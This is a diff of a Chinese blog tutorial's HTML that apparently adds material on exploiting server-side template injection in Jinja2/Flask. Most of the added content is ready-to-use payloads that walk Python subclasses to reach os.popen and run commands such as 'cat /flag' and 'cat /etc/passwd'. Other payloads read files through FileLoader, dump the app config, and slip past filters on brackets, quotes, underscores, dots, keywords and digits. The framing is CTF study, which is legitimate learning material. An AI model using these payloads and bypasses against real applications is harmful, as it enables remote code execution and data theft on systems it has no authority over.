@@ -48,7 +48,7 @@ SSTI漏洞原理：服务">
 <p>模板：就是一种固定好的web格式。我们可以直接拿来用做网页。</p>
 <p>模板渲染：个人理解为将模板投放到网页上进行展示。</p>
 <p>SSTI漏洞就发生在模板被渲染的过程中。</p>
-<p>SSTI漏洞原理：服务端接收攻击者的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了攻击者插入的可以破坏模板的语句，从而达到攻击者的目的。</p>
+<h1 id="SSTI漏洞原理："><a href="#SSTI漏洞原理：" class="headerlink" title="SSTI漏洞原理："></a>SSTI漏洞原理：</h1><p>服务端接收攻击者的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了攻击者插入的可以破坏模板的语句，从而达到攻击者的目的。</p>
 <p>看两段代码就明白了</p>
 <p><img src="/source/images/SSTI%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/1.png"></p>
 <p>这个是没有ssti的代码，下面看一个存在ssti的</p>
@@ -59,6 +59,80 @@ SSTI漏洞原理：服务">
 <p><img src="/source/images/SSTI%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/3.png"></p>
 <p><img src="/source/images/SSTI%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/4.png"></p>
 <p>这就是ssti漏洞的体现。</p>
+<h1 id="ssti漏洞利用："><a href="#ssti漏洞利用：" class="headerlink" title="ssti漏洞利用："></a>ssti漏洞利用：</h1><p>继承关系与魔术方法：我们知道python中存在父类与子类。下面看代码</p>
+<p><img src="/source/images/SSTI%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/6.png"></p>
+<p>这段代码定义了A类和它的子类，输出结果为</p>
+<p><img src="/source/images/SSTI%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/7.png"></p>
+<p>显示为：c的类为C，c的父类为B，c的父类的父类为A。</p>
+<p>最终所有类的父类都为object。</p>
+<p>魔术方法：</p>
+<p>class输出当前类，base输出当前类的父类，mro输出所有的父类直到最终父类即object</p>
+<p>subclasses()查看当前类的所有子类，init检查是否重载，globals查看全局变量和方法</p>
+<p><img src="/source/images/SSTI%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/8.png"></p>
+<h3 id="一般注入过程："><a href="#一般注入过程：" class="headerlink" title="一般注入过程："></a>一般注入过程：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.&#123;&#123;&#x27;&#x27;.__class__&#125;&#125;     &#x27;&#x27;为字符串，该字符串放到有ssti的地方会输出str，因为&#x27;&#x27;是属于字符串类的。</span><br><span class="line">不一定非要是&#x27;&#x27;，这里只是方便引用，还可以用&quot;&quot;，[]等，因为最终父类都会是object类</span><br><span class="line">2.&#123;&#123;&#x27;&#x27;.__class__.__base__&#125;&#125;  输出object类</span><br><span class="line">3.&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()&#125;&#125;输出所有子类，object子类非常非常多.我们利用的便是object子类下的一些模块</span><br><span class="line">4.&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[117].__init__.__globals__&#125;&#125; 查看类下的所有方法</span><br><span class="line">5.&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[117].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;  builtins提供对python的所有内置标识符的直接访问</span><br><span class="line">eval计算字符串表达式的值   popen()执行一个shell运行命令来开启一个进程。</span><br><span class="line">6.&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[117].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;  该效果与5相同</span><br></pre></td></tr></table></figure>
+
+<p><img src="/source/images/SSTI%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/9.png"></p>
+<p>一般利用的就是os._wrap_close模块进行攻击。找到这个模块查看他在第几位，数组下标从0开始。然后利用该模块下的方法</p>
+<h3 id="利用ssti进行文件读取："><a href="#利用ssti进行文件读取：" class="headerlink" title="利用ssti进行文件读取："></a>利用ssti进行文件读取：</h3><p>查找object下的_frozen_importlib_external.FileLoader方法在第几位。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload: &#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[79][&quot;get_data&quot;](0,&#x27;/flag&#x27;)&#125;&#125; #79是指在第79位，要根据情况修改。get_data是该类下的方法。后面的参数&#x27;/flag&#x27;要填完整路径。也要根据实际情况修改.</span><br><span class="line">该payload作用是读取/flag文件内容并输出</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用ssti进行rce："><a href="#利用ssti进行rce：" class="headerlink" title="利用ssti进行rce："></a>利用ssti进行rce：</h3><p>其实为了绕过一些被禁用的类来选用不同的类进行rce</p>
+<p>1.os模块进行rce</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[117].__init__.__globals__.os.popen(&#x27;id&#x27;).read()&#125;&#125; #popen里的内容就是python代码，所以id可以替换成自己想执行的命令，自己找os.py模块在第几位替换掉117</span><br></pre></td></tr></table></figure>
+
+<p>2.importlib类执行命令</p>
+<p>3.subprocess.Popen类执行命令</p>
+<p>4.linecache类执行命令</p>
+<h1 id="ssti的payload的过滤及绕过方法"><a href="#ssti的payload的过滤及绕过方法" class="headerlink" title="ssti的payload的过滤及绕过方法"></a>ssti的payload的过滤及绕过方法</h1><p>1.<strong>绕过过滤双大括号</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(&#x27;&#x27;.__class__.__base__.__subclasses__()[117].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read())%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.<strong>无回显ssti</strong></p>
+<p>网上有脚本</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_73051164/article/details/132463475">https://blog.csdn.net/weixin_73051164/article/details/132463475</a></p>
+<p>3.<strong>绕过中括号</strong></p>
+<p>用getitem</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>4.<strong>绕过单双引号</strong></p>
+<p>利用flask内部的request函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post传参：&#123;&#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.args.popen](request.args.cmd).read()&#125;&#125;</span><br><span class="line">get传参：?popen=popen&amp;cmd=cat flag</span><br></pre></td></tr></table></figure>
+
+<p>利用了request函数从get传参中导入内容来绕过，这样就不需要引号了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.form.popen](request.form.cmd).read()&#125;&#125;&amp;popen=popen&amp;cmd=cat flag</span><br></pre></td></tr></table></figure>
+
+<p>将args改为form即可利用post传参，不需要get传了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post传参：&#123;&#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.cookie.popen](request.cookie.cmd).read()&#125;&#125;</span><br><span class="line">cookie传参：popen=popen;cmd=cat flag</span><br></pre></td></tr></table></figure>
+
+<p>改为cookie即可利用cookie传参</p>
+<p>5.<strong>绕过下划线</strong></p>
+<p>(1)用attr配合request函数绕过下划线过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原payload:&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br><span class="line">不用下划线：</span><br><span class="line">post传参：&#123;&#123;()|attr(request.args.cla)|attr(request.args.bas)|attr(request.args.sub)()|attr(request.args.gei)(117)|attr(request.args.ini)|attr(request.args.glo)|attr(request.args.gei)(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;)|attr(&#x27;read&#x27;)()&#125;&#125;</span><br><span class="line">get传参：?cla=__class__&amp;bas=__base__&amp;sub=__subclasses__&amp;ini=__init__&amp;glo=__globals__&amp;gei=__getitem__</span><br></pre></td></tr></table></figure>
+
+<p>(2)编码绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;cat /flag&#x27;).read()&#125;&#125;将下划线用unicode编码格式替换即可  也可以用16进制表示</span><br></pre></td></tr></table></figure>
+
+<p>6**.绕过点过滤**</p>
+<p>利用中括号[]代替</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如：&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__base__&#x27;][&#x27;__subclasses__()&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>7.<strong>绕过关键字</strong></p>
+<p>过滤了class,arg,from,value,int,global等关键字</p>
+<p>（1）拼接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[&#x27;__class__&#x27;]&#125;&#125; --&gt;&#123;&#123;()[&#x27;__cla&#x27;+&#x27;ss__&#x27;]&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>   (2)  jinja2的~拼接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set a=&#x27;__cla&#x27;%&#125;</span><br><span class="line">&#123;%set b=&#x27;ss__&#x27;%&#125;</span><br><span class="line">&#123;&#123;()[a~b]&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;%set a=&#x27;__cla&#x27;%&#125;&#123;%set b=&#x27;__cla&#x27;%&#125;&#123;%set c=&#x27;__ba&#x27;%&#125;&#123;%set d=&#x27;se__&#x27;%&#125;&#123;%set e=&#x27;__subcl&#x27;%&#125;&#123;%set f=&#x27;asses__&#x27;%&#125;&#123;%set g=&#x27;__in&#x27;%&#125;&#123;%set h=&#x27;it__&#x27;%&#125;&#123;%set i=&#x27;__glo&#x27;%&#125;&#123;%set j=&#x27;bals__&#x27;%&#125;&#123;%set k=&#x27;po&#x27;%&#125;&#123;%set l=&#x27;_pen&#x27;%&#125;&#123;&#123;&quot;&quot;[a~b][c~d][e~f]()[199][g~h][i~j][&#x27;os&#x27;][k~l](&#x27;cat flag&#x27;)[&#x27;read&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>8.<strong>绕过数字</strong></p>
+<p>利用过滤器length</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set a=&#x27;aaaaaa&#x27;|length %&#125;&#123;&#123;a&#125;&#125;  输出6</span><br><span class="line">&#123;%set a=&#x27;aaaaaa&#x27;|length*&#x27;aaa&#x27; |length%&#125;&#123;&#123;a&#125;&#125;  输出18</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[a].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125; a即可代替数字</span><br></pre></td></tr></table></figure>
+
+<p>9.获取config</p>
+<p>flag可能藏在config文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接获取&#123;&#123;config&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">调用获取&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
+
 </section>
     
         
